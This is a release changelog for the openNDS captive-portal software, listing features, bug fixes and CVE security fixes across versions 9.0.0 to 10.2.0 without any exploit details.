 -- Rob White <dot@blue-wave.net> Wed, 07 Jun 2024 07:31:46 +0000
opennds (10.2.0) \* Add - Page 202 HTTP\_ACCEPTED for future use [bluewavenet] \* Fix - remove redundant workaround for old MHD versions [bluewavenet] \* Fix - some nft and other error messages [bluewavenet] \* Fix - remove unnecessary debug messages [bluewavenet] \* Add - improved ndsctl status detection for authmon [bluewavenet] \* Add - increase RestartSec parameter in opennds.service for generic Linux [bluewavenet] \* Fix - prevent unnecessary shutdown [bluewavenet] \* Fix - Generic Linux, error updating dnsmasq.conf [bluewavenet] \* Add - allow dynamic update of flowtable rules [bluewavenet] \* Fix - use Themespec in place of deprecated preauth in ndectl status [bluewavenet] \* Fix - Generic linux - keep old config [bluewavenet] \* Fix - remove some unused variables [bluewavenet] \* Add - support for nftables blocklists [bluewavenet] \* Add - ensure authenticated user rules are added in list order [bluewavenet] \* Add - Set default authenticated policy to accept [bluewavenet] \* Add - urandom hash to key generation [bluewavenet] \* Fix - Fix - duplicate users\_to\_router rules [bluewavenet] \* Add - Automatic dns resolution of fas\_remotefqdn in nftables rules [bluewavenet] \* Add - flowtables rules [bluewavenet] \* Add - dynamic flowtable support allowing multiple upstream connections [bluewavenet] \* Add - skip preemptivemac client if not dhcp database or is already authenticated [bluewavenet] \* Add - Skip auth\_restore if client is in preemptivemac list [bluewavenet] \* Add - use daemon\_auth in auth\_restore [bluewavenet] \* Add - Dynamic refresh of configured preemptive macs [bluewavenet] \* Fix - suppress demon\_auth debug output [bluewavenet] \* Add - urlencode ALL list blocks and introduce preemptivemac lists [bluewavenet] \* Add - fas-hid-https to makefiles [bluewavenet] \* Add - warning that pre-shared key will be generated and added to config if not present [bluewavenet] \* Add - b64decode payload in fas [bluewavenet] \* Add - b64encode payload before sending to fas [bluewavenet] \* Add - level 4 fas-hid-https [bluewavenet] \* Add - support for fas\_secure\_enabled = 4 [bluewavenet] \* Add - updates to comments in fas-hid script [bluewavenet] \* Fix - fas-hid icon position [bluewavenet] \* Add - wget\_request support to authmon [bluewavenet] \* Add - ruleset full parsing of verdict, protocol ports to/from address [bluewavenet] \* Fix - send\_to\_fas\_deauthed [bluewavenet] \* Fix - ensure action is parsed correctly in all cases [bluewavenet] \* Add - Quota based Fair Usage Policy, sets throttled rate when quota exceeded [bluewavenet] \* Add - QL code scanning support in Community theme\_voucher ThemeSpec script [bluewavenet] \* Add - support for cpi\_query in example FAS scripts [bluewavenet] \* Fix - memory leak when deleting client from client list [bluewavenet] \* Add - html entity handling for semicolon [bluewavenet] \* Add - Store RFC8910 request string in client data [bluewavenet]
 -- Rob White <dot@blue-wave.net> Wed, 22 Nov 2023 11:08:15 +0000
opennds (10.1.3) \* Security Advisory. This version contains fixes for multiple potential security vulnerabilities \* Credit - Stanislav Dashevskyi - standash.github.io [standash] \* It also contains some minor bug fixes \* Fix - Buffer overflow causing segfault - CVE-2023-41101 [bluewavenet] \* Fix - Memory leaks due to passing allocated buffer into safe\_asprintf() - CVE-2023-41102 [bluewavenet] \* Fix - Remove deprecated preauth option [bluewavenet] \* Fix - missing free in show\_preauth\_page if MHD does not respond [bluewavenet] \* Fix - more safe\_asprintf memory leaks [bluewavenet] \* Fix - missing free for mark\_auth [bluewavenet] \* Fix - memory leak after starting authmon daemon [bluewavenet] \* Fix - memory leak in encode\_and\_redirect\_to\_splashpage [bluewavenet] \* Fix - Community themespec, voucher css and logo image [bluewavenet] \* Fix - ThemeSpec, path to logo in page footer [bluewavenet] \* Fix - ensure gatewayurl is urldecoded to fix broken css and images in themespec [bluewavenet] \* Add - set default fas remote fqdn to disabled [bluewavenet]
 -- Rob White <dot@blue-wave.net> Sat, 28 Aug 2023 09:46:35 +0000
opennds (10.1.2) \* Security Advisory. This version contains fixes for multiple potential security vulnerabilities \* Credit - Stanislav Dashevskyi - standash.github.io [standash] \* It also contains some minor bug fixes \* Fix - Generate unique sha256 faskey if not set in config - CVE-2023-38324 [bluewavenet] \* Fix - NULL pointer dereference if user\_agent is NULL - CVE-2023-38320, CVE-2023-38322 [bluewavenet] \* Fix - NULL pointer dereference if authdir is called with an incomplete or missing query string - CVE-2023-38313, CVE-2023-38314, CVE-2023-38315 [bluewavenet] \* Fix - remove deprecated and non-functioning unescape callback - CVE-2023-38316 [bluewavenet] \* Fix - prevent potential recursive dependency and detect if conflicting package is installed [bluewavenet]
 -- Rob White <dot@blue-wave.net> Sat, 29 Jul 2023 10:04:52 +0000
opennds (10.1.1) \* This version contains some minor bug fixes and documentation updates \* Fix - send only contents of buffer, not entire buffer when serving page511 [bluewavenet] \* Fix - Set fas\_remotefqdn to gw\_fqdn when overriding FAS settings [bluewavenet] \* Fix - use absolute path for css and images in ThemeSpec [bluewavenet] \* Fix - revert to old option names without underscores [bluewavenet] \* Fix - FAS URL when fas\_remotefqdn is not set [bluewavenet]
 -- Rob White <dot@blue-wave.net> Fri, 14 Jul 2023 13:56:50 +0000
opennds (10.1.0)
 \* This version is a major upgrade including full migration to nftables \* and native uci configuration support even for generic Linux distributions. \* It also includes a significant refactoring of inbuilt memory management, \* improving long term reliability, fixing several memory leaks, buffer overflows and several edge case crashes. \* Add - support for included custom binauth script [bluewavenet] \* Add - emit a useful stderr message if auth\_restore fails [bluewavenet] \* Add - procd respawn threshold, respawn timeout and respawn retry parameters [bluewavenet] \* Add - user friendly commandline message if already running [bluewavenet] \* Fix - Enabling of Data volume quotas [bluewavenet] \* Fix - use get\_list\_from\_config instead of get\_option\_from\_config [bluewavenet] \* Fix - compiler warning - unused variable [bluewavenet] \* Fix - remove redundant function call ipsetconf [bluewavenet] \* Fix - walledgarden for both nftset and ipset on OpenWrt [bluewavenet] \* Add - more meaningful output if attempt is made to restart when already running [bluewavenet] \* Fix - resolve gatewayfqdn after startup [bluewavenet] \* Fix - Choose forground or background running according to commandline arguments [bluewavenet] \* Fix - remove superfluous debug message [bluewavenet] \* Fix - replace sleep with procd\_set\_param term\_timeout [bluewavenet] \* Fix - make option enabled default to enabled [bluewavenet] \* Fix - report authmon pid instead of opennds pid from authmon [bluewavenet] \* Fix - ensure correct pid obtained for opennds [bluewavenet] \* Add - StartLimitIntervalSec and StartLimitBurst to systemd service script [bluewavenet] \* Fix - refactor remote downloads [bluewavenet] \* Fix - suppress error message on ipset test failure [bluewavenet] \* Fix - send non-syslog debug information to stdout by default [bluewavenet] \* Add - C function to check heartbeat watchdog [bluewavenet] \* Fix - Update generic Linux makefile [bluewavenet] \* Fix - remove redundant ruleset struct definition [bluewavenet] \* Fix - potential buffer overflow issue during config stage [bluewavenet] \* Fix - remove unnecessary calls to free() in page 404 processing [bluewavenet] \* Fix - remove redundant code from fw\_iptables [bluewavenet] \* Add - updates to binauth\_log script [bluewavenet] \* Add - updates for service startup, systemd and procd [bluewavenet] \* Add - refactoring of commandline processing [bluewavenet] \* Fix - remove debugging message [bluewavenet] \* Fix - typo in client ruleset [bluewavenet] \* Add - Refactor to use uci config directly even for Generic Linux [bluewavenet] \* Add - Parsing for multi item lists with spaces in items [bluewavenet] \* Add - use common library call get\_option\_fom\_config [bluewavenet] \* Add - support for direct use of uci format config file - string and integer parameters [bluewavenet] \* Fix - Remove deprecated syslog\_facility config setting [bluewavenet] \* Add - thread busy message to ndsctl [bluewavenet] \* Add - refactor configure\_log\_location [bluewavenet] \* Fix - suppress LOG\_NOTICE message when getting mac of interface [bluewavenet] \* Fix - ndsctl error message [bluewavenet] \* Fix - get\_client\_interface for levels 2 and 3 [bluewavenet] \* Add - use common library write\_log function [bluewavenet] \* Add - Refactor memory management [bluewavenet] \* Fix - fix and refactor upload rate limiting rules [bluewavenet] \* Fix - Change a debug message from err to info [bluewavenet] \* Add - refine common buffer sizes [bluewavenet] \* Add - use initialised heap memory for redirect\_to\_splashpage [bluewavenet] \* Add - user message to themespec [bluewavenet] \* Add - auth\_restore support ie reauth clients after a restart by default. [bluewavenet] \* Add - Library call to preemptively re-auth clients after a restart or crash [bluewavenet] \* Add - BinAuth, write an authenticated clients list [bluewavenet] \* Add - library call "check\_heartbeat" [bluewavenet] \* Fix - Tidy up redundant code [bluewavenet] \* Fix - change warning message to debug message when iw not installed [bluewavenet] \* Add - library call to log to syslog [bluewavenet] \* Fix - use initialised heap memory for client list entries [bluewavenet] \* Fix - ignore legacy ipset firewall rule [bluewavenet] \* Fix - refactor memory management for MHD calls - use heap memory for buffers etc [bluewavenet] \* Fix - missing free causing memory leak [bluewavenet] \* Fix - predefine and initialise buffer for send\_redirect\_temp [bluewavenet] \* Add - support protocol "all" in firewall ruleset [bluewavenet] \* Add - pre-allocation of initialised buffers [bluewavenet] \* Fix - prevent buffer overrun on removing client [bluewavenet] \* Add - update MHD connection timeout and connection limit [bluewavenet] \* Add - chain ndsDLR for dynamic client download rate limiting rules [bluewavenet] \* Add - Use Internal Polling Thread / Thread Per Connection in MHD [bluewavenet] \* Add - some new default values [bluewavenet] \* Fix - remove some redundant code and fix some compiler warnings [bluewavenet] \* Fix - remove redundant library command string [bluewavenet] \* Fix - Tidy up redundant iptables code [bluewavenet] \* Add - convert trusted client support to nftables [bluewavenet] \* Add - refer to nftables [bluewavenet] \* Add - move code for generating authentication mark string to initial setup [bluewavenet] \* Add - full nftset support with ipset import where required [bluewavenet] \* Add - nftset support library calls [bluewavenet] \* Add - ipset\_to\_nftset library call [bluewavenet] \* Add - support for nftables version of append\_ruleset and nftables\_compile [bluewavenet] \* Fix - buffer overflow in page\_511 generation [bluewavenet] \* Add - more nftables migration including rate quotas [bluewavenet] \* Fix - change GatewayInterface to lower case [bluewavenet] \* Add - upload and download limiting client flags for future use [bluewavenet] \* add - lib calls "pad\_string" and "replace\_client\_rule" [bluewavenet] \* Add - further nftables migration [bluewavenet] \* Fix - correctly parse options from legacy conf file [bluewavenet] \* Fix - some compiler warnings and set min iptables version [bluewavenet] \* Add - Generic Linux configure walledgarden [bluewavenet] \* Add - Implementation of nftsets for walledgarden [bluewavenet] \* Add - migration to nftables, next phase. [bluewavenet] \* Add - library function delete\_client\_rule [bluewavenet] \* Fix - remove duplicate definition [bluewavenet] \* Add - First stage migration to nftables [bluewavenet]
 -- Rob White <dot@blue-wave.net> Tue, 14 Jun 2023 14:22:50 +0000
opennds (9.10.0)
 \* This version adds new functionality, and fixes some issues \* Fix - unable to read client upload traffic volume on some versions of iptables-nft (generic Linux) [bluewavenet] \* Fix - compatibility with bash shell on generic Linux [bluewavenet] \* Fix - compiler warning, unused variable [bluewavenet] \* Fix - silently continue if fw4 table is not found [bluewavenet] \* Add - Start daemon earlier on boot [bluewavenet] \* Fix - compatibility with legacy iptables packages [bluewavenet] \* Add - call to delete nft chains [bluewavenet] \* Fix - stop using legacy INPUT and FORWARD chains [bluewavenet] \* Add - watchdog restart if openNDS nftables ruleset is missing [bluewavenet] \* Add - automated rule setting/deleting for users\_to\_router [bluewavenet] \* Add - Change fwhook to add users to router rule to fw4 on OpenWrt [bluewavenet] \* Add - Set allow or passthrough mode for users\_to\_router rules [bluewavenet] \* Fix - set fwhook default to disabled to prevent restart on hotplug event [bluewavenet] \* Fix - fas-aes-https description comments [bluewavenet] \* Fix - icon overspill on splash pages [bluewavenet] \* Fix - missing config option in community script [bluewavenet] \* Fix - urlencode handling of "$" character and add htmlentity encode/decode library call [bluewavenet]
 -- Rob White <dot@blue-wave.net> Tue, 17 Jan 2023 14:33:27 +0000
opennds (9.9.1)
 \* This version fixes some issues \* Fix - minimalise deprecated legacy .conf file \* Fix - Prevent rate limit refresh if rate limit is set to 0 [bluewavenet] \* Fix - Mute some unneccessary debug messages [bluewavenet] \* Fix - do not write unconfigured (null) parameters to client id file (cidfile) [bluewavenet] \* Fix - Prevent error "Command process exited due to signal 13" when executing an external script [bluewavenet] \* Fix - use WTERMSIG() return code for \_execute\_ret when execute fails [bluewavenet] \* Fix - use correct response type for error 503 [bluewavenet] \* Update Makefile description [bluewavenet] \* Add - Community Local FAS install script [bluewavenet] \* Update - Mention TCP port 80 requires AutonomousWG [afriza]
 -- Rob White <dot@blue-wave.net> Thu, 12 Nov 2022 20:39:31 +0000
opennds (9.9.0)
 \* This version adds new functionality, and fixes some issues \* Add - Community ThemeSpec to support legacy splash.html [bluewavenet] \* Fix - ensure nat\_traversal\_poll\_interval defaults to 10 seconds [bluewavenet] \* Add - process send\_to\_fas\_deauthed and send\_to\_fas\_custom in fas-aes-https [bluewavenet] \* Add - support for send\_to\_fas\_deauthed library call in binauth\_log.sh [bluewavenet] \* Add - heartbeat file containing timestamp [bluewavenet] \* Add - send\_to\_fas\_deauthed and send\_to\_fas\_custom library calls [bluewavenet] \* Add - Save authmon daemon startup arguments for libopennds [bluewavenet] \* Fix - potential divide by zero errors [bluewavenet] \* Add - option nat\_traversal\_poll\_interval [bluewavenet] \* Add - Library calls for urlencode and urldecode[bluewavenet] \* Fix - Don't download remotes if ThemeSpec not configured [bluewavenet] \* Add - Error report in syslog if dhcp database is not found [bluewavenet] \* Add - library calls, deauth and daemon\_deauth [bluewavenet] \* Fix - change WTERMSIG log from WARNING to NOTICE [bluewavenet] \* Add - Set minimum bucket size to 5 regardless of configured bucket ratio [bluewavenet] \* Fix - safe\_vasprint return value [bluewavenet] \* Add - test if safe\_calloc failed and serve error 503 [bluewavenet] \* Add - use calloc instead of malloc[bluewavenet] \* fix - safe functions to return error rather than exit [bluewavenet] \* Add - b64decode custom string received by binauth script [bluewavenet]
 -- Rob White <dot@blue-wave.net> Thu, 03 Oct 2022 16:52:46 +0000
opennds (9.8.0)
 \* This version adds new functionality, and fixes some issues \* Fix - suppress stderr in client\_params in generic linux [bluewavenet] \* Fix - client\_params on generic linux, remote logo not supported yet [bluewavenet] \* Fix - compiler warning [bluewavenet] \* Fix - set voucher script as executable [bluewavenet] \* Update OpenWrt Makefile [bluewavenet] \* Add - format footer in Themespec scripts [bluewavenet] \* Update footer on all scripts [bluewavenet] \* Update - Community Voucher Themespec [bluewavenet] \* Add - Check on startup for Y2.038K bug (32 bit time) [bluewavenet] \* Fix - Remove deprecated Debian specific files [bluewavenet] \* Add - More css updates [bluewavenet] \* Add - user friendly RFC8910 page511 text and remove refresh button [bluewavenet] \* Fix - MHD becomes unresponsive serving page 511 for rfc8910 clients [bluewavenet] \* Add - extra startup settings - ignore\_sigpipe and write nds info [bluewavenet] \* Add - set MHD connection limit to 100, set MHD listen backlog size to 128, set MHD\_HTTP\_HEADER\_CONNECTION "close" [bluewavenet] \* Fix - Add missing LOG\_CRIT in debug [bluewavenet] \* Add - some useful diagnostic output in authmon [bluewavenet] \* Fix - Move testing to community [bluewavenet] \* Fix - Community - Use tmpfs by default for vouchers.txt file [bluewavenet] \* Add - README with use instructions and notice about flash wearout [fservida] \* Fix - Refactor folder structure for community themespec [fservida] \* Add - Create vouchers.txt [fservida] \* Add - Create theme\_voucher.sh [fservida] \* Update - README.md [bluewavenet] \* Add - image download info message [bluewavenet] \* Add - css updates [dianariyanto] \* Add - allow downloaded remotes refresh for all modes [bluewavenet] \* Add - download\_resources.sh to installed files [bluewavenet] \* Add - support for download of custom images and files in the status.client page [bluewavenet] \* Remove - Debian man page support [bluewavenet] \* Fix - Add missing mkdir command in Makefile [dzatoah] \* Fix - typos in src/{conf, main}.c [dzatoah]
 -- Rob White <dot@blue-wave.net> Wed, 05 Aug 2022 15:00:13 +0000
opennds (9.7.0)
 \* This version adds new functionality, and fixes some issues \* Fix - syntax error (missing comma) in awk command in bash on generic Linux [bluewavenet] \* Add - option to append serial number suffix to gatewayname [bluewavenet] \* Add - block use of ip aliases on gateway interface [doctor-ox] [bluewavenet] \* Fix - ndsctl json syntax error [bluewavenet] \* Add - check for null variables in key value pairs in MHD callbacks [bluewavenet] \* Fix - changed some notice messages into debug messages [bluewavenet] \* Fix - possible return of incorrect pid [doctor-ox] [bluewavenet] \* Fix - possible abiguities resulting in failure to parse parameters correctly [bluewavenet] \* Fix - Remove deprecated get\_client\_token.sh [bluewavenet] \* Fix - Prevent possible malformed mac address returned from dhcpcheck() [doctor-ox] [bluewavenet]
 -- Rob White <dot@blue-wave.net> Wed, 16 Mar 2022 15:54:29 +0000
opennds (9.6.0)
 \* This version adds new functionality, and fixes some issues \* Fix - correctly display return buffer in syslog [bluewavenet] \* Add - use heap allocation for library call return buffer [bluewavenet] \* Fix - OpenWrt, fhook request for fw3 [bluewavenet] \* Add - spider remote urls before downloading [bluewavenet] \* Add - OpenWrt, revert uncommitted uci updates at startup and shutdown [bluewavenet] \* Fix - remove unneccesary flash writes and fix hosts updates [doctor-ox] [bluewavenet] \* Add - Updated splash images [bluewavenet] \* Add - OpenWrt makefile for nft or ipt dependencies [bluewavenet] \* Fix - grep by word to prevent any ambiguity [doctor-ox] [bluewavenet] \* Fix - ensure rate limiting is disabled if rate thresholds are set to zero [bluewavenet] \* Add - querystring support for client status page [bluewavenet] \* Add - Advanced/standard status page checkbox [bluewavenet] \* Add - set default session timeout to 24 hours [bluewavenet] \* Fix - potential buffer overflow [bluewavenet] \* Fix - Restrict max packet limit to iptables maximum [bluewavenet] \* Fix - descriptive labels on ndsctl status output [bluewavenet] \* Add - update of README.md [bluewavenet] \* Fix - Added required variable to FAS return string example documentation [dorkone] \* Add - Default checkinterval set to 15 seconds [bluewavenet] \* Fix - incoming and outgoing counters when unlimited bursting is enabled [bluewavenet] \* Add - maximum bucket size configuration [bluewavenet] \* Add - calculate moving average packet size for rate limiting [bluewavenet] \* Add - some operational default values [bluewavenet] \* Add - initial rate limits when unrestricted bursting is disabled [bluewavenet] \* Add - Require clients to be in the dhcp database [bluewavenet] \* Add - dhcpcheck library call [bluewavenet] \* Fix - Remove trailing whitespace when getting clientaddress if client not active [bluewavenet] \* Fix - Segfault when FAS fails to Return customstring [dorkone] [bluewavenet] \* Add - Enable/Disable unrestricted bursting [bluewavenet] \* Add - gatewayurl to querystring and use in place of originurl in FAS [bluewavenet] \* Fix - more accurate debug message [bluewavenet] \* Fix - Show packet rate correctly as packets per minute [bluewavenet] \* Add - Report Packet Rate and Bucket Size in ndsctl status and json and status client page [bluewavenet] \* Add - rate limit refresh to client limit rules [bluewavenet] \* Fix - code readability [bluewavenet] \* Fix - Documentation for data sent to Authmon Daemon [bluewavenet] \* Add - Show unrestricted burst intervals in ndsctl status [bluewavenet] \* Add - Set default bucket ratios to 10 [bluewavenet]
 -- Rob White <dot@blue-wave.net> Fri, 18 Feb 2022 09:35:51 +0000
opennds (9.5.1)
 \* This minor version update fixes two important issues \* Fix - ThemeSpec file downloads when mwan3 is running [bluewavenet] \* Fix - Preemptive auth failure after previous deauth [minhng99] [bluewavenet]
 -- Rob White <dot@blue-wave.net> Thu, 16 Dec 2021 16:22:16 +0000
opennds (9.5.0)
 \* This version adds new functionality, and fixes some issues \* Add - use average packet size instead of MTU when implementing rate limiting [bluewavenet] \* Fix - typo in iptables command and remove a redundant command [bluewavenet] \* Add - startdaemon() and stopdaemon() utility functions [bluewavenet] \* Add - combined interface/ipaddress external gateway status monitoring [bluewavenet] \* Fix - potential online/offline detection problem when mwan3 is running [bluewavenet] \* Add - get\_debug\_level and syslog library calls [bluewavenet] \* Fix - correctly reset upload and download rate rules [bluewavenet] \* Add - extend upstream gateway checking for use with mwan3 loadbalance/failover [bluewavenet] \* Fix - Potential NULL pointer segfault in http\_microhttpd on calling authenticated() [bluewavenet] \* Fix - Potential NULL pointer segfault in http\_microhttpd on calling preauthenticated() [dddaniel] \* Add - Calculate Bucket size based on achieved burst rate [bluewavenet] \* Fix - prevent parameter parsing if clientip not known [bluewavenet] \* Add - disable rate quotas by setting bucket ratio to zero [bluewavenet] \* Fix - suppress some debug messages [bluewavenet] \* Add - more libraries documentation [bluewavenet] \* Add - library calls startdaemon and stopdaemon [bluewavenet] \* Fix - Increase buffer length for longer interface names [koivunen] \* Add - Update README.md [bluewavenet] \* Add - bucket ratio option to config file [bluewavenet] \* Add - upload and download bucket ratio config values [bluewavenet] \* Fix - flag initial debuglevel to externals [bluewavenet] \* Add - limit-burst tuning to rate quotas [bluewavenet] \* Fix - add trailing space to defaultip [bluewavenet] \* Add - record pre-emptive authentication in local log [bluewavenet] \* Add - Write to local log function to libopennds [bluewavenet] \* Add - set client\_type and custom string for Pre-emptive authentication [bluewavenet] \* Fix - Remove trailing newline from library call response [bluewavenet] \* Fix - attempt to remove cid file only if client->cid is set [bluewavenet] \* Add - a skip option for custom downloads to speed up serving page from themespec [bluewavenet] \* Add - put client\_type into query string when type is cpd canary [bluewavenet] \* Add - set refresh=0 before loading images [bluewavenet] \* Fix - Truncated return status [bluewavenet] \* Add - Acknowlegement from call to dnsconfig [bluewavenet] \* Fix - potential buffer overflow in debug output [bluewavenet] \* Add - processing of custom data and client type [bluewavenet] \* Add - Client Type for RFC8908 and RFC8910 clients [bluewavenet] \* Add - rfc8908 replies for external FAS and refactor memory management for MHD calls [bluewavenet] \* Add - send error 403 if client is not on openNDS subnet [bluewavenet] \* Fix - remove uneccessary safe\_asprint in auth.c [bluewavenet] \* Fix - Initialise buffer to prevent receiving spurious characters [bluewavenet] \* Add - encoded custom data support to ndsctl json, themespec and binauth [bluewavenet] \* Add - advert\_1.htm to thankyou page of theme\_click-to-continue-custom-placeholders.sh [bluewavenet] \* Add - library call get\_interface\_by\_ip [bluewavenet] \* Add - function encode\_custom() for encoding custom data to be sent to openNDS [bluewavenet] \* Fix - error 511, make all html refrences absolute to enforce link to MHD [bluewavenet] \* Add - check status\_path exists and is executeable [bluewavenet] \* Fix - regression causing error 511 to be served from default script [bluewavenet] \* Add - venue-info-url and can-extend-session json keys [bluewavenet] \* Add - RFC 8908 initial experimental support [bluewavenet] \* Add - debug message when resetting client [bluewavenet] \* Fix - Ensure the ndscids directory exists before trying to write to it. [bluewavenet] \* Fix - use eval in do\_ndsctl to allow quoting of arguments [bluewavenet] \* Fix - ensure client hid and client cid file is reset correctly [bluewavenet] \* Fix - Titles of example ThemeSpec Files [bluewavenet] \* Fix - Ensure ThemeSpec Files are executable [bluewavenet] \* Remove - deprecated Allowed and Blocked entries in ndsctl status output [bluewavenet] \* Add - Deprecate option macmechanism, allowedmaclist and blockedmaclist [bluewavenet]
 -- Rob White <dot@blue-wave.net> Wed, 8 Dec 2021 06:45:56 +0000
opennds (9.4.0)
 \* This version adds new functionality, and fixes some issues \* Add - Error message in fas-aes-https if shared key is mismatched [bluewavenet] \* Fix - and refactor error 511 page generation[bluewavenet] \* Fix - and refactor dnsmasq configuration [bluewavenet] \* Fix - Typographic error preventing RFC8910 disable [bluewavenet] \* Add - gateway address and gatewayfqdn to ndsctl json output [bluewavenet] \* Add - RFC8910 housekeeping on startup and shutdown [bluewavenet] \* Add - correctly apply dhcp option 114 for generic Linux [bluewavenet] \* Add - reading of configured ndsctlsocket in ndsctl utility[bluewavenet] \* Add - use send\_error 200 for MHD watchdog [bluewavenet] \* Add - generation of page\_511 html by library script [bluewavenet] \* Add - extend debuglevel support to library scripts [bluewavenet] \* Refactor - fas-aes-https to simplify and make customisation of http easier [bluewavenet] \* Add - library script for error 511 page, allowing customisation [bluewavenet] \* Add - make authmon report connection error details [bluewavenet] \* Fix- remove unwanted debug message in ndsctl [bluewavenet] \* Add - RFC8910 support by default [bluewavenet] \* Add - display status page when accessing /login when authenticated [bluewavenet] \* Add - MHD response to RFC8910 requests [bluewavenet] \* Add - Dnsmasq RFC8910 configuration [bluewavenet] \* Add - send error 511 in response to unsupported http method [bluewavenet] \* Add - Check for ca-bundle on OpenWrt, if not installed, add syslog messages and terminate [bluewavenet] \* Add - Make ndsctl use the configured value for socket path if set and deprecate -s option [bluewavenet] \* Add - Warning message when Walled Garden port 80 is allowed [bluewavenet] \* Fix - remove un-needed pthread\_kill in termination\_handler() [bluewavenet] [T-X] \* Fix - debug messages from authmon.sh [bluewavenet] \* Fix - Allow disabling gateway fqdn, facilitating access to router port 80 [bluewavenet] \* Fix - Segfault in ndsctl when -s option is used incorrectly [bluewavenet] [T-X] \* Fix - Typo making calculation of ul/dl rates incorrect [bluewavenet] \* Fix - Allow port 80 to be configured in the Walled Garden [bluewavenet]
 -- Rob White <dot@blue-wave.net> Wed, 22 Sep 2021 19:39:08 +0000
opennds (9.3.0)
 \* This version adds new functionality, and fixes some issues \* Add - firewall passthrough mode for authenticated users [bluewavenet] \* Add - use configured debuglevel in authmon [bluewavenet] \* Add - automated log rotation and client\_zone to binauth\_log [bluewavenet] \* Add - increased timeout interval for file downloads [bluewavenet] \* Add - local interface to MeshZone and remove unneeded call to ip utility [bluewavenet] \* Add - log\_mountpoint and max\_log\_entries options [bluewavenet] \* Add - config variables ext\_interface and ext\_gateway [bluewavenet] \* Add - Start initial download of remotes only if online [bluewavenet] \* Add - Router online/offline watchdog [bluewavenet] \* Fix - Segfault when gatewayfqdn is disabled [bluewavenet] \* Fix - missing clientmac when not using themespec [bluewavenet] \* Fix - some compiler warnings [bluewavenet] \* Fix - use configured value for webroot for remote image symlink to images folder [bluewavenet] \* Fix - remove refrences to login.sh in documentation and comments [bluewavenet] \* Fix - Prevent potential read overrun within the MHD page buffer [bluewavenet] \* Remove - legacy get\_ext\_iface() function [bluewavenet]
 -- Rob White <dot@blue-wave.net> Sun, 8 Aug 2021 09:58:02 +0000
opennds (9.2.0)
 \* This version adds new functionality, improves performance, adds documentation and fixes an issue \* Add - new config options to ndsctl status [bluewavenet] \* Add - Readthedocs / man documentation for configuration options [bluewavenet] \* Add - Faster convergence of average rates to configured rate quotas [bluewavenet] \* Add - BinAuth parse authenticated client database for client data [bluewavenet] \* Add - Use heap allocation for http page buffer allowing large page sizes [bluewavenet] \* Fix - fail to serve downloaded images on custom themespec [bluewavenet]
 -- Rob White <dot@blue-wave.net> Sun, 11 July 2021 15:05:39 +0000
opennds (9.1.1)
 \* This version fixes a compiler error, some compiler warnings and mutes a debug message \* Fix - Compiler error, missing mode in call to open() [bluewavenet] \* Fix - Compiler warning, ignored return value from call to lockf() [bluewavenet] \* Fix - Compiler warning, ignored return value from call to system() [bluewavenet] \* Fix - Compiler warning, ignored return value from call to fgets() [bluewavenet] \* Fix - Remove debug message from call to get\_client\_interface library [bluewavenet]
 -- Rob White <dot@blue-wave.net> Sun, 4 July 2021 21:07:21 +0000
opennds (9.1.0)
 \* This version introduces new functionality, some changes and fixes \* Add - option statuspath to enable alternate status page scripts [bluewavenet] \* Add - ndsctl lockf() file locking [bluewavenet] [T-X] \* Add - b64encode to ndsctl [bluewavenet] \* Add - option max\_page\_size for MHD [bluewavenet] \* Add - option remotes\_refresh\_interval [bluewavenet] \* Add - Pre-download remote files in background after startup [bluewavenet] \* Add - client id data files created by openNDS on client connect [bluewavenet] \* Add - check routing is configured and up [bluewavenet] \* Add - support for Preemptive Authentication for connected client devices. [bluewavenet] \* Add - Gateway interface watchdog [bluewavenet] \* Remove - deprecated IFB config [bluewavenet] \* Fix - ndsctl, send return codes [bluewavenet] \* Fix - MHD Watchdog Use uclient-fetch in OpenWrt [bluewavenet] \* Fix - Improve MHD watchdog [bluewavenet] \* Fix - update legacy code in ndsctl\_thread [bluewavenet] \* Fix - edge case where MHD returns (null) as host value [bluewavenet]
 -- Rob White <dot@blue-wave.net> Thu, 24 June 2021 15:06:30 +0000
openNDS (9.0.0)
 \* This version introduces major new functionality, some changes and fixes \* Add - post-request - add upstream payload [bluewavenet] \* Add - post-request - base64 encode payload [bluewavenet] \* Add - authmon add more status checking and default to view mode for upstream processing [bluewavenet] \* Add - authmon add housekeeping call, limit concurrent authentications, send auth-ack [bluewavenet] \* Add - fas-aes-https add housekeeping call, add auth-ack support, add "try again" button [bluewavenet] \* Add - "$" character added to htmlentityencode [bluewavenet] \* Add - Theme support - theme\_click-to-continue [bluewavenet] \* Add - Themespec, custom variables and custom images options to OpenWrt config [bluewavenet] \* Add - Support for ThemeSpecPath, FasCustomParametersList, FasCustomVariablesList, FasCustomImagesList [bluewavenet] \* Add - Example theme - click-to-continue-custom-placeholders [bluewavenet] \* Add - Increase Buffer sizes to support custom parameters [bluewavenet] \* Add - themespec\_path argument [bluewavenet] \* Add - Increase buffers for custom vars and images [bluewavenet] \* Add - Increase command buffer for custom vars and images [bluewavenet] \* Add - Increase HTMLMAXSIZE [bluewavenet] \* Add - Use MAX\_BUF for fasparam, fasvar and fasimage [bluewavenet] \* Add - support for ThemeSpec files and placeholders [bluewavenet] \* Add - Theme Click to Continue with Custom Placeholders [bluewavenet] \* Add - make custom field a required entry [bluewavenet] \* Add - bash/ash check and simplify image download config [bluewavenet] \* Add - example custom images and text placeholders to click-to-continue-custom [bluewavenet] \* Add - theme\_user-email-login-custom-placeholders [bluewavenet] \* Add - Status page for login failure [bluewavenet] \* Add - fas\_custom\_files\_list and update Makefiles [bluewavenet] \* Add - Autoconfiguration of ndsctl socket file to use tmpfs mountpoint [bluewavenet] \* Add - example custom images and custom html [bluewavenet] \* Add - Set default gateway interface br-lan [bluewavenet] \* Add - libopennds, set wget timeout [bluewavenet] \* Add - allow disabling of gatewayfqdn [bluewavenet] \* Add - packet rate limiting for upload/download rate quotas [bluewavenet] \* Add - get custom resources from Github branch [bluewavenet] \* Add - functions start\_mhd() and stop\_mhd() [bluewavenet] \* Add - MHD Watchdog - restart MHD if required [bluewavenet] \* Add - Pause and retry popen on failure [bluewavenet] \* Add - function get\_key\_from\_config() [bluewavenet] \* Remove - deprecated traffic control code [bluewavenet] \* Remove - deprecated binauth scripts [bluewavenet] \* Remove - deprecated legacy splash page support [bluewavenet] \* Remove - deprecated ndsctl clients [bluewavenet] \* Remove - outdated PreAuth scripts [bluewavenet] \* Refactor - Move hid to head of query string [bluewavenet] \* Refactor - Move libopennds to libs \* Fix - ndsctl auth crashed opennds if session duration argument was null [bluewavenet] \* Fix - fas-aes-https - correctly set path for authlist for most server types [bluewavenet] \* Fix - suppress BinAuth syslog notice 